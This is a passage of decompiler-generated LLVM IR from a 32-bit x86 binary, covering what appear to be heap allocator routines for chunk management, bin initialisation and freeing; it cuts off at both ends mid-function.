  %tmp10 = urem i32 %v3_8050dd7, %v3_8050dc4
  store i32 %tmp10, i32* @edx, align 4
  %v1_8050ddf = add i32 %div, -1
  %v4_8050de2 = mul i32 %v1_8050ddf, %v3_8050dc4
  store i32 %v4_8050de2, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8050de2, 1
  br i1 %tmp11, label %dec_label_pc_8050e40, label %dec_label_pc_8050de9

dec_label_pc_8050de9:                             ; preds = %dec_label_pc_8050dbb
  %v1_8050dee = call i32 @function_8051f21(i32 0)
  store i32 %v1_8050dee, i32* %edi.global-to-local, align 4
  %v0_8050df5 = load i32, i32* @esi, align 4
  store i32 %v0_8050df5, i32* %eax.global-to-local, align 4
  %v1_8050df7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050df7 = add i32 %v1_8050df7, 44
  %v3_8050df7 = inttoptr i32 %v2_8050df7 to i32*
  %v4_8050df7 = load i32, i32* %v3_8050df7, align 4
  %v5_8050df7 = add i32 %v4_8050df7, %v0_8050df5
  store i32 %v5_8050df7, i32* %eax.global-to-local, align 4
  %v12_8050dfd = icmp eq i32 %v1_8050dee, %v5_8050df7
  %v1_8050dff = icmp eq i1 %v12_8050dfd, false
  br i1 %v1_8050dff, label %dec_label_pc_8050e40, label %dec_label_pc_8050e01

dec_label_pc_8050e01:                             ; preds = %dec_label_pc_8050de9
  %v1_8050e04 = sub i32 0, %v4_8050de2
  store i32 %v1_8050e04, i32* @ebx, align 4
  %v1_8050e07 = call i32 @function_8051f21(i32 %v1_8050e04)
  store i32 %v1_8050e07, i32* %eax.global-to-local, align 4
  %v1_8050e13 = call i32 @function_8051f21(i32 0)
  store i32 %v1_8050e13, i32* %eax.global-to-local, align 4
  %v10_8050e1b = icmp eq i32 %v1_8050e13, -1
  br i1 %v10_8050e1b, label %dec_label_pc_8050e40, label %dec_label_pc_8050e20

dec_label_pc_8050e20:                             ; preds = %dec_label_pc_8050e01
  %v0_8050e20 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050e22 = sub i32 %v0_8050e20, %v1_8050e13
  %v12_8050e22 = icmp eq i32 %v2_8050e22, 0
  store i32 %v2_8050e22, i32* %ecx.global-to-local, align 4
  br i1 %v12_8050e22, label %dec_label_pc_8050e40, label %dec_label_pc_8050e26

dec_label_pc_8050e26:                             ; preds = %dec_label_pc_8050e20
  %v0_8050e26 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050e26 = add i32 %v0_8050e26, 44
  %v2_8050e26 = inttoptr i32 %v1_8050e26 to i32*
  %v3_8050e26 = load i32, i32* %v2_8050e26, align 4
  store i32 %v3_8050e26, i32* %eax.global-to-local, align 4
  %v1_8050e29 = add i32 %v0_8050e26, 872
  %v2_8050e29 = inttoptr i32 %v1_8050e29 to i32*
  %v3_8050e29 = load i32, i32* %v2_8050e29, align 4
  %v5_8050e29 = sub i32 %v3_8050e29, %v2_8050e22
  store i32 %v5_8050e29, i32* %v2_8050e29, align 4
  %v0_8050e2f = load i32, i32* @esi, align 4
  %v1_8050e2f = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050e2f = sub i32 %v0_8050e2f, %v1_8050e2f
  %v1_8050e31 = or i32 %v2_8050e2f, 1
  %v1_8050e34 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e34 = add i32 %v1_8050e34, 4
  %v3_8050e34 = inttoptr i32 %v2_8050e34 to i32*
  store i32 %v1_8050e31, i32* %v3_8050e34, align 4
  br label %dec_label_pc_8050e40

dec_label_pc_8050e40:                             ; preds = %dec_label_pc_8050dbb, %dec_label_pc_8050de9, %dec_label_pc_8050e01, %dec_label_pc_8050e20, %dec_label_pc_8050e26
  %storemerge = phi i32 [ 1, %dec_label_pc_8050e26 ], [ 0, %dec_label_pc_8050e20 ], [ 0, %dec_label_pc_8050e01 ], [ 0, %dec_label_pc_8050de9 ], [ 0, %dec_label_pc_8050dbb ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050e13, { 1, 0, 2 }
  uselistorder i32 %v4_8050de2, { 1, 2, 0 }
  uselistorder i32 %v3_8050dc4, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8051f21, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8050e40, { 4, 3, 2, 1, 0 }
}

define i32 @function_8050e48(i32* %arg1) local_unnamed_addr {
dec_label_pc_8050e48:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8050e49 = load i32, i32* @edi, align 4
  %v0_8050e4a = load i32, i32* @esi, align 4
  %v0_8050e4b = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_8050e53 = load i32, i32* %arg1, align 4
  store i32 %v2_8050e53, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050e5a = icmp eq i32 %v2_8050e53, 0
  br i1 %v1_8050e5a, label %dec_label_pc_8050f74.lr.ph, label %dec_label_pc_8050e62

dec_label_pc_8050f74.lr.ph:                       ; preds = %dec_label_pc_8050e48
  %v3_8050f78 = add i32 %tmp20, 44
  br label %dec_label_pc_8050f74

dec_label_pc_8050e62:                             ; preds = %dec_label_pc_8050e48
  %v1_8050e66 = and i32 %v2_8050e53, -3
  store i32 %v1_8050e66, i32* %arg1, align 4
  %v1_8050e6b = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_8050e76 = add i32 %tmp20, 4
  store i32 %v1_8050e76, i32* %eax.global-to-local, align 4
  %v2_8050e81 = load i32, i32* %arg1, align 4
  %v2_8050e87 = udiv i32 %v2_8050e81, 8
  %v2_8050e8a = mul nuw i32 %v2_8050e87, 4
  %v3_8050e8a = add i32 %tmp20, -4
  %v4_8050e8a = add i32 %v3_8050e8a, %v2_8050e8a
  store i32 %v4_8050e8a, i32* %eax.global-to-local, align 4
  %v2_8050f51 = add i32 %tmp20, 44
  %v3_8050f51 = inttoptr i32 %v2_8050f51 to i32*
  %v1_8050f24 = add i32 %tmp20, 60
  %v2_8050f24 = inttoptr i32 %v1_8050f24 to i32*
  br label %dec_label_pc_8050e92

dec_label_pc_8050e92:                             ; preds = %dec_label_pc_8050f60, %dec_label_pc_8050e62
  %v0_8050ea0 = phi i32 [ %v1_8050e76, %dec_label_pc_8050e62 ], [ %v4_8050f6a, %dec_label_pc_8050f60 ]
  store i32 %v0_8050ea0, i32* %eax.global-to-local, align 4
  %v1_8050e96 = inttoptr i32 %v0_8050ea0 to i32*
  %v2_8050e96 = load i32, i32* %v1_8050e96, align 4
  store i32 %v2_8050e96, i32* @ecx, align 4
  %v1_8050e98 = icmp eq i32 %v2_8050e96, 0
  br i1 %v1_8050e98, label %dec_label_pc_8050f60, label %dec_label_pc_8050ea0

dec_label_pc_8050ea0:                             ; preds = %dec_label_pc_8050e92
  store i32 0, i32* %v1_8050e96, align 4
  %v0_8050ea6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050ea6

dec_label_pc_8050ea6:                             ; preds = %dec_label_pc_8050f54, %dec_label_pc_8050ea0
  %v0_8050ec3 = phi i32 [ %v3_8050ea6, %dec_label_pc_8050f54 ], [ %v0_8050ea6.pre, %dec_label_pc_8050ea0 ]
  %v1_8050ea6 = add i32 %v0_8050ec3, 8
  %v2_8050ea6 = inttoptr i32 %v1_8050ea6 to i32*
  %v3_8050ea6 = load i32, i32* %v2_8050ea6, align 4
  store i32 %v3_8050ea6, i32* %edx.global-to-local, align 4
  %v1_8050ead = add i32 %v0_8050ec3, 4
  %v2_8050ead = inttoptr i32 %v1_8050ead to i32*
  %v3_8050ead = load i32, i32* %v2_8050ead, align 4
  store i32 %v3_8050ead, i32* %eax.global-to-local, align 4
  %v1_8050eb2 = and i32 %v3_8050ead, -2
  store i32 %v1_8050eb2, i32* @edi, align 4
  %v2_8050eb5 = urem i32 %v3_8050ead, 2
  %v3_8050eb5 = icmp eq i32 %v2_8050eb5, 0
  %v2_8050eb7 = add i32 %v1_8050eb2, %v0_8050ec3
  store i32 %v2_8050eb7, i32* @ebx, align 4
  %v1_8050eba = add i32 %v2_8050eb7, 4
  %v2_8050eba = inttoptr i32 %v1_8050eba to i32*
  %v3_8050eba = load i32, i32* %v2_8050eba, align 4
  store i32 %v3_8050eba, i32* %edx.global-to-local, align 4
  %v1_8050ec1 = icmp eq i1 %v3_8050eb5, false
  br i1 %v1_8050ec1, label %dec_label_pc_8050ee3, label %dec_label_pc_8050ec3

dec_label_pc_8050ec3:                             ; preds = %dec_label_pc_8050ea6
  %v1_8050ec3 = inttoptr i32 %v0_8050ec3 to i32*
  %v2_8050ec3 = load i32, i32* %v1_8050ec3, align 4
  store i32 %v2_8050ec3, i32* %ebp.global-to-local, align 4
  %v2_8050ec7 = sub i32 %v0_8050ec3, %v2_8050ec3
  store i32 %v2_8050ec7, i32* %eax.global-to-local, align 4
  %v1_8050ec9 = add i32 %v2_8050ec7, 8
  %v2_8050ec9 = inttoptr i32 %v1_8050ec9 to i32*
  %v3_8050ec9 = load i32, i32* %v2_8050ec9, align 4
  store i32 %v3_8050ec9, i32* @esi, align 4
  %v1_8050ecc = add i32 %v2_8050ec7, 12
  %v2_8050ecc = inttoptr i32 %v1_8050ecc to i32*
  %v3_8050ecc = load i32, i32* %v2_8050ecc, align 4
  store i32 %v3_8050ecc, i32* %edx.global-to-local, align 4
  %v1_8050ecf = add i32 %v3_8050ec9, 12
  %v2_8050ecf = inttoptr i32 %v1_8050ecf to i32*
  %v3_8050ecf = load i32, i32* %v2_8050ecf, align 4
  store i32 %v3_8050ecf, i32* @ecx, align 4
  %v12_8050ed2 = icmp eq i32 %v3_8050ecf, %v2_8050ec7
  %v1_8050ed4 = icmp eq i1 %v12_8050ed2, false
  br i1 %v1_8050ed4, label %dec_label_pc_8050f13, label %dec_label_pc_8050ed6

dec_label_pc_8050ed6:                             ; preds = %dec_label_pc_8050ec3
  %v1_8050ed6 = add i32 %v3_8050ecc, 8
  %v2_8050ed6 = inttoptr i32 %v1_8050ed6 to i32*
  %v3_8050ed6 = load i32, i32* %v2_8050ed6, align 4
  %v15_8050ed6 = icmp eq i32 %v3_8050ed6, %v3_8050ecf
  %v1_8050ed9 = icmp eq i1 %v15_8050ed6, false
  br i1 %v1_8050ed9, label %dec_label_pc_8050f13, label %dec_label_pc_8050edb

dec_label_pc_8050edb:                             ; preds = %dec_label_pc_8050ed6
  %v2_8050edb = add i32 %v2_8050ec3, %v1_8050eb2
  store i32 %v2_8050edb, i32* @edi, align 4
  store i32 %v3_8050ecc, i32* %v2_8050ecf, align 4
  %v0_8050ee0 = load i32, i32* @esi, align 4
  %v1_8050ee0 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050ee0 = add i32 %v1_8050ee0, 8
  %v3_8050ee0 = inttoptr i32 %v2_8050ee0 to i32*
  store i32 %v0_8050ee0, i32* %v3_8050ee0, align 4
  %v0_8050eee.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050ee3

dec_label_pc_8050ee3:                             ; preds = %dec_label_pc_8050ea6, %dec_label_pc_8050edb
  %v1_8050ef7 = phi i32 [ %v2_8050eb7, %dec_label_pc_8050ea6 ], [ %v0_8050eee.pre, %dec_label_pc_8050edb ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8050eeb = and i32 %v3_8050eba, -4
  store i32 %v1_8050eeb, i32* %ebp.global-to-local, align 4
  %v4_8050eee = load i32, i32* %v3_8050f51, align 4
  %v15_8050eee = icmp eq i32 %v1_8050ef7, %v4_8050eee
  br i1 %v15_8050eee, label %dec_label_pc_8050f44, label %dec_label_pc_8050ef3

dec_label_pc_8050ef3:                             ; preds = %dec_label_pc_8050ee3
  %v2_8050ef3 = add i32 %v1_8050ef7, 4
  %v3_8050ef3 = add i32 %v2_8050ef3, %v1_8050eeb
  %v4_8050ef3 = inttoptr i32 %v3_8050ef3 to i32*
  %v5_8050ef3 = load i32, i32* %v4_8050ef3, align 4
  store i32 %v5_8050ef3, i32* %eax.global-to-local, align 4
  %v3_8050ef7 = inttoptr i32 %v2_8050ef3 to i32*
  store i32 %v1_8050eeb, i32* %v3_8050ef7, align 4
  %v0_8050efa = load i32, i32* %eax.global-to-local, align 4
  %v1_8050efa = urem i32 %v0_8050efa, 2
  %v2_8050efa = icmp eq i32 %v1_8050efa, 0
  store i32 %v1_8050efa, i32* %eax.global-to-local, align 4
  %v1_8050eff = icmp eq i1 %v2_8050efa, false
  br i1 %v1_8050eff, label %dec_label_pc_8050f20, label %dec_label_pc_8050f01

dec_label_pc_8050f01:                             ; preds = %dec_label_pc_8050ef3
  %v0_8050f01 = load i32, i32* @ebx, align 4
  %v1_8050f01 = add i32 %v0_8050f01, 8
  %v2_8050f01 = inttoptr i32 %v1_8050f01 to i32*
  %v3_8050f01 = load i32, i32* %v2_8050f01, align 4
  store i32 %v3_8050f01, i32* @edx, align 4
  %v1_8050f04 = add i32 %v0_8050f01, 12
  %v2_8050f04 = inttoptr i32 %v1_8050f04 to i32*
  %v3_8050f04 = load i32, i32* %v2_8050f04, align 4
  store i32 %v3_8050f04, i32* %eax.global-to-local, align 4
  %v1_8050f07 = add i32 %v3_8050f01, 12
  %v2_8050f07 = inttoptr i32 %v1_8050f07 to i32*
  %v3_8050f07 = load i32, i32* %v2_8050f07, align 4
  store i32 %v3_8050f07, i32* @esi, align 4
  %v12_8050f0a = icmp eq i32 %v3_8050f07, %v0_8050f01
  %v1_8050f0c = icmp eq i1 %v12_8050f0a, false
  br i1 %v1_8050f0c, label %dec_label_pc_8050f13, label %dec_label_pc_8050f0e

dec_label_pc_8050f0e:                             ; preds = %dec_label_pc_8050f01
  %v1_8050f0e = add i32 %v3_8050f04, 8
  %v2_8050f0e = inttoptr i32 %v1_8050f0e to i32*
  %v3_8050f0e = load i32, i32* %v2_8050f0e, align 4
  %v15_8050f0e = icmp eq i32 %v3_8050f0e, %v3_8050f07
  br i1 %v15_8050f0e, label %dec_label_pc_8050f18, label %dec_label_pc_8050f13

dec_label_pc_8050f13:                             ; preds = %dec_label_pc_8050f0e, %dec_label_pc_8050f01, %dec_label_pc_8050ed6, %dec_label_pc_8050ec3
  %v0_8050f13 = call i32 @function_805118c()
  store i32 %v0_8050f13, i32* %eax.global-to-local, align 4
  %v1_8050f1a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050f18

dec_label_pc_8050f18:                             ; preds = %dec_label_pc_8050f0e, %dec_label_pc_8050f13
  %v1_8050f1a = phi i32 [ %v3_8050f01, %dec_label_pc_8050f0e ], [ %v1_8050f1a.pre, %dec_label_pc_8050f13 ]
  %v0_8050f1a = phi i32 [ %v3_8050f04, %dec_label_pc_8050f0e ], [ %v0_8050f13, %dec_label_pc_8050f13 ]
  %v0_8050f18 = load i32, i32* @edi, align 4
  %v1_8050f18 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050f18 = add i32 %v1_8050f18, %v0_8050f18
  store i32 %v2_8050f18, i32* @edi, align 4
  %v2_8050f1a = add i32 %v1_8050f1a, 12
  %v3_8050f1a = inttoptr i32 %v2_8050f1a to i32*
  store i32 %v0_8050f1a, i32* %v3_8050f1a, align 4
  %v0_8050f1d = load i32, i32* @edx, align 4
  %v1_8050f1d = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f1d = add i32 %v1_8050f1d, 8
  %v3_8050f1d = inttoptr i32 %v2_8050f1d to i32*
  store i32 %v0_8050f1d, i32* %v3_8050f1d, align 4
  br label %dec_label_pc_8050f20

dec_label_pc_8050f20:                             ; preds = %dec_label_pc_8050ef3, %dec_label_pc_8050f18
  store i32 %v1_8050e6b, i32* %eax.global-to-local, align 4
  %v3_8050f24 = load i32, i32* %v2_8050f24, align 4
  store i32 %v3_8050f24, i32* @edx, align 4
  %v0_8050f27 = load i32, i32* @ecx, align 4
  store i32 %v0_8050f27, i32* %v2_8050f24, align 4
  %v0_8050f2a = load i32, i32* @edi, align 4
  %v1_8050f2c = or i32 %v0_8050f2a, 1
  store i32 %v1_8050f2c, i32* %eax.global-to-local, align 4
  %v0_8050f2f = load i32, i32* @ecx, align 4
  %v1_8050f2f = load i32, i32* @edx, align 4
  %v2_8050f2f = add i32 %v1_8050f2f, 12
  %v3_8050f2f = inttoptr i32 %v2_8050f2f to i32*
  store i32 %v0_8050f2f, i32* %v3_8050f2f, align 4
  %v0_8050f32 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f32 = load i32, i32* @ecx, align 4
  %v2_8050f32 = add i32 %v1_8050f32, 4
  %v3_8050f32 = inttoptr i32 %v2_8050f32 to i32*
  store i32 %v0_8050f32, i32* %v3_8050f32, align 4
  store i32 %v1_8050e6b, i32* %eax.global-to-local, align 4
  %v0_8050f39 = load i32, i32* @edx, align 4
  %v1_8050f39 = load i32, i32* @ecx, align 4
  %v2_8050f39 = add i32 %v1_8050f39, 8
  %v3_8050f39 = inttoptr i32 %v2_8050f39 to i32*
  store i32 %v0_8050f39, i32* %v3_8050f39, align 4
  %v0_8050f3c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f3c = load i32, i32* @ecx, align 4
  %v2_8050f3c = add i32 %v1_8050f3c, 12
  %v3_8050f3c = inttoptr i32 %v2_8050f3c to i32*
  store i32 %v0_8050f3c, i32* %v3_8050f3c, align 4
  %v0_8050f3f = load i32, i32* @edi, align 4
  %v1_8050f3f = load i32, i32* @ecx, align 4
  %v3_8050f3f = add i32 %v1_8050f3f, %v0_8050f3f
  %v4_8050f3f = inttoptr i32 %v3_8050f3f to i32*
  store i32 %v0_8050f3f, i32* %v4_8050f3f, align 4
  br label %dec_label_pc_8050f54

dec_label_pc_8050f44:                             ; preds = %dec_label_pc_8050ee3
  %v0_8050f44 = load i32, i32* @edi, align 4
  %v2_8050f44 = add i32 %v0_8050f44, %v1_8050eeb
  %v1_8050f47 = or i32 %v2_8050f44, 1
  store i32 %v1_8050f47, i32* %eax.global-to-local, align 4
  %v1_8050f4a = load i32, i32* @ecx, align 4
  %v2_8050f4a = add i32 %v1_8050f4a, 4
  %v3_8050f4a = inttoptr i32 %v2_8050f4a to i32*
  store i32 %v1_8050f47, i32* %v3_8050f4a, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_8050f51 = load i32, i32* @ecx, align 4
  store i32 %v0_8050f51, i32* %v3_8050f51, align 4
  br label %dec_label_pc_8050f54

dec_label_pc_8050f54:                             ; preds = %dec_label_pc_8050f20, %dec_label_pc_8050f44
  store i32 %v3_8050ea6, i32* @ecx, align 4
  %v1_8050f58 = icmp eq i32 %v3_8050ea6, 0
  %v1_8050f5a = icmp eq i1 %v1_8050f58, false
  br i1 %v1_8050f5a, label %dec_label_pc_8050ea6, label %dec_label_pc_8050f60

dec_label_pc_8050f60:                             ; preds = %dec_label_pc_8050f54, %dec_label_pc_8050e92
  %v15_8050f64 = icmp eq i32 %v0_8050ea0, %v4_8050e8a
  %v4_8050f6a = add i32 %v0_8050ea0, 4
  br i1 %v15_8050f64, label %dec_label_pc_8050fe8, label %dec_label_pc_8050e92

dec_label_pc_8050f74:                             ; preds = %dec_label_pc_8050f74.lr.ph, %dec_label_pc_8050f74
  %v1_8050f78 = phi i32 [ 1, %dec_label_pc_8050f74.lr.ph ], [ %v0_8050f83, %dec_label_pc_8050f74 ]
  %v2_8050f78 = mul i32 %v1_8050f78, 8
  %v4_8050f78 = add i32 %v3_8050f78, %v2_8050f78
  store i32 %v4_8050f78, i32* %eax.global-to-local, align 4
  %v1_8050f7c = add i32 %v1_8050f78, 1
  store i32 %v1_8050f7c, i32* %edx.global-to-local, align 4
  %v2_8050f7d = add i32 %v4_8050f78, 12
  %v3_8050f7d = inttoptr i32 %v2_8050f7d to i32*
  store i32 %v4_8050f78, i32* %v3_8050f7d, align 4
  %v0_8050f80 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f80 = add i32 %v0_8050f80, 8
  %v3_8050f80 = inttoptr i32 %v2_8050f80 to i32*
  store i32 %v0_8050f80, i32* %v3_8050f80, align 4
  %v0_8050f83 = load i32, i32* %edx.global-to-local, align 4
  %v7_8050f86 = icmp sgt i32 %v0_8050f83, 95
  br i1 %v7_8050f86, label %dec_label_pc_8050f88, label %dec_label_pc_8050f74

dec_label_pc_8050f88:                             ; preds = %dec_label_pc_8050f74
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8050f8c = add i32 %tmp20, 864
  %v2_8050f8c = inttoptr i32 %v1_8050f8c to i32*
  %v3_8050f8c = load i32, i32* %v2_8050f8c, align 4
  %v4_8050f8c = or i32 %v3_8050f8c, 1
  store i32 %v4_8050f8c, i32* %v2_8050f8c, align 4
  %v0_8050f93 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f93 = add i32 %v0_8050f93, 840
  %v2_8050f93 = inttoptr i32 %v1_8050f93 to i32*
  store i32 0, i32* %v2_8050f93, align 4
  %v0_8050f9d = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f9d = add i32 %v0_8050f9d, 852
  %v2_8050f9d = inttoptr i32 %v1_8050f9d to i32*
  store i32 65536, i32* %v2_8050f9d, align 4
  %v0_8050fa7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fa7 = add i32 %v0_8050fa7, 844
  %v2_8050fa7 = inttoptr i32 %v1_8050fa7 to i32*
  store i32 262144, i32* %v2_8050fa7, align 4
  %v0_8050fb1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fb1 = add i32 %v0_8050fb1, 836
  %v2_8050fb1 = inttoptr i32 %v1_8050fb1 to i32*
  store i32 262144, i32* %v2_8050fb1, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_8050fc2 = load i32, i32* %arg1, align 4
  %v1_8050fc4 = urem i32 %v2_8050fc2, 4
  %v1_8050fc7 = or i32 %v1_8050fc4, 72
  store i32 %v1_8050fc7, i32* %arg1, align 4
  %v0_8050fcc = load i32, i32* @edx, align 4
  %v1_8050fce = add i32 %v0_8050fcc, 52
  store i32 %v1_8050fce, i32* %eax.global-to-local, align 4
  %v2_8050fd1 = add i32 %v0_8050fcc, 44
  %v3_8050fd1 = inttoptr i32 %v2_8050fd1 to i32*
  store i32 %v1_8050fce, i32* %v3_8050fd1, align 4
  %v1_8050fd6 = call i32 @function_80515d0(i32 30)
  store i32 %v1_8050fd6, i32* %eax.global-to-local, align 4
  %v2_8050fe2 = add i32 %tmp20, 860
  %v3_8050fe2 = inttoptr i32 %v2_8050fe2 to i32*
  store i32 %v1_8050fd6, i32* %v3_8050fe2, align 4
  br label %dec_label_pc_8050fe8

dec_label_pc_8050fe8:                             ; preds = %dec_label_pc_8050f60, %dec_label_pc_8050f88
  store i32 %v0_8050e4b, i32* @ebx, align 4
  store i32 %v0_8050e4a, i32* @esi, align 4
  store i32 %v0_8050e49, i32* @edi, align 4
  %v0_8050fef = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050fef

; uselistorder directives
  uselistorder i32 %v0_8050f83, { 1, 0 }
  uselistorder i32 %v0_8050f80, { 1, 0 }
  uselistorder i32 %v1_8050f78, { 1, 0 }
  uselistorder i32 %v0_8050f3f, { 1, 0 }
  uselistorder i32 %v1_8050efa, { 1, 0 }
  uselistorder i32 %v2_8050ef3, { 1, 0 }
  uselistorder i32 %v1_8050eeb, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050ef7, { 1, 0 }
  uselistorder i32 %v3_8050ea6, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8050ec3, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050ea0, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8050f51, { 1, 0 }
  uselistorder i32 %v1_8050e6b, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_8050fe8, { 1, 0 }
  uselistorder label %dec_label_pc_8050f74, { 1, 0 }
  uselistorder label %dec_label_pc_8050f54, { 1, 0 }
  uselistorder label %dec_label_pc_8050f20, { 1, 0 }
  uselistorder label %dec_label_pc_8050f18, { 1, 0 }
  uselistorder label %dec_label_pc_8050ee3, { 1, 0 }
}

define i32 @function_8050ff0(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050ff0:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050ff0 = load i32, i32* @ebp, align 4
  %v0_8050ff1 = load i32, i32* @edi, align 4
  %v0_8050ff2 = load i32, i32* @esi, align 4
  %v0_8050ff3 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050ffb = icmp eq i32 %arg1, 0
  br i1 %v1_8050ffb, label %dec_label_pc_8051184, label %dec_label_pc_8051003

dec_label_pc_8051003:                             ; preds = %dec_label_pc_8050ff0
  %v2_805100e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805100e, i32* @eax, align 4
  %v2_8051013 = call i32 @function_8051757(i32 %v2_805100e, i32 134551380)
  store i32 %v2_8051013, i32* %eax.global-to-local, align 4
  %v1_805101f = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_805395c.31 to i32))
  %v1_8051024 = add i32 %arg1, -8
  store i32 %v1_8051024, i32* @ecx, align 4
  %v0_8051027 = load i8, i8* @global_var_8053c40.32, align 1
  %v1_8051027 = sext i8 %v0_8051027 to i32
  store i32 %v1_8051027, i32* %eax.global-to-local, align 4
  %v1_805102f = add i32 %arg1, -4
  %v2_805102f = inttoptr i32 %v1_805102f to i32*
  %v3_805102f = load i32, i32* %v2_805102f, align 4
  %v1_8051034 = and i32 %v3_805102f, -4
  %v4_8051034 = trunc i32 %v1_8051034 to i8
  store i32 %v1_8051034, i32* @ebx, align 4
  %v8_8051039 = icmp ugt i8 %v4_8051034, %v0_8051027
  br i1 %v8_8051039, label %dec_label_pc_805105b, label %dec_label_pc_805103b

dec_label_pc_805103b:                             ; preds = %dec_label_pc_8051003
  %v2_805103b = udiv i32 %v3_805102f, 8
  %v1_805103e = or i32 %v1_8051027, 3
  %v3_805103e = trunc i32 %v1_805103e to i8
  store i32 %v1_805103e, i32* %eax.global-to-local, align 4
  store i8 %v3_805103e, i8* @global_var_8053c40.32, align 64
  %v1_8051046 = mul nuw i32 %v2_805103b, 4
  %v2_8051046 = add i32 %v1_8051046, ptrtoint (i8* @global_var_8053c40.32 to i32)
  store i32 %v2_8051046, i32* @edx, align 4
  %v1_805104d = add i32 %v1_8051046, add (i32 ptrtoint (i8* @global_var_8053c40.32 to i32), i32 -4)
  %v2_805104d = inttoptr i32 %v1_805104d to i32*
  %v3_805104d = load i32, i32* %v2_805104d, align 4
  store i32 %v3_805104d, i32* %eax.global-to-local, align 4
  %v3_8051050 = inttoptr i32 %arg1 to i32*
  store i32 %v3_805104d, i32* %v3_8051050, align 4
  %v0_8051053 = load i32, i32* @ecx, align 4
  %v1_8051053 = load i32, i32* @edx, align 4
  %v2_8051053 = add i32 %v1_8051053, -4
  %v3_8051053 = inttoptr i32 %v2_8051053 to i32*
  store i32 %v0_8051053, i32* %v3_8051053, align 4
  br label %dec_label_pc_8051173

dec_label_pc_805105b:                             ; preds = %dec_label_pc_8051003
  %v1_805105b = trunc i32 %v3_805102f to i8
  %v2_805105b = and i8 %v1_805105b, 2
  %v3_805105b = icmp eq i8 %v2_805105b, 0
  %v5_805105b = zext i8 %v2_805105b to i32
  %v7_805105b = and i32 %v3_805102f, -256
  %v8_805105b = or i32 %v5_805105b, %v7_805105b
  store i32 %v8_805105b, i32* @edx, align 4
  %v1_805105e = icmp eq i1 %v3_805105b, false
  br i1 %v1_805105e, label %dec_label_pc_8051153, label %dec_label_pc_8051064

dec_label_pc_8051064:                             ; preds = %dec_label_pc_805105b
  %v1_8051064 = or i32 %v1_8051027, 1
  %v3_8051064 = trunc i32 %v1_8051064 to i8
  store i32 %v1_8051064, i32* %eax.global-to-local, align 4
  %v2_8051067 = add i32 %v1_8051034, %v1_8051024
  store i32 %v2_8051067, i32* @esi, align 4
  store i8 %v3_8051064, i8* @global_var_8053c40.32, align 64
  %v1_805106f = add i32 %v2_8051067, 4
  %v2_805106f = inttoptr i32 %v1_805106f to i32*
  %v3_805106f = load i32, i32* %v2_805106f, align 4
  store i32 %v3_805106f, i32* %eax.global-to-local, align 4
  %v2_8051076 = inttoptr i32 %v1_805102f to i8*
  %v3_8051076 = load i8, i8* %v2_8051076, align 1
  %v4_8051076 = urem i8 %v3_8051076, 2
  %v5_8051076 = icmp eq i8 %v4_8051076, 0
  %v1_805107a = icmp eq i1 %v5_8051076, false
  br i1 %v1_805107a, label %dec_label_pc_805109d, label %dec_label_pc_805107c

dec_label_pc_805107c:                             ; preds = %dec_label_pc_8051064
  %v2_805107c = inttoptr i32 %v1_8051024 to i32*
  %v3_805107c = load i32, i32* %v2_805107c, align 4
  store i32 %v3_805107c, i32* @ebp, align 4
  %v2_8051081 = sub i32 %v1_8051024, %v3_805107c
  store i32 %v2_8051081, i32* %eax.global-to-local, align 4
  %v1_8051083 = add i32 %v2_8051081, 8
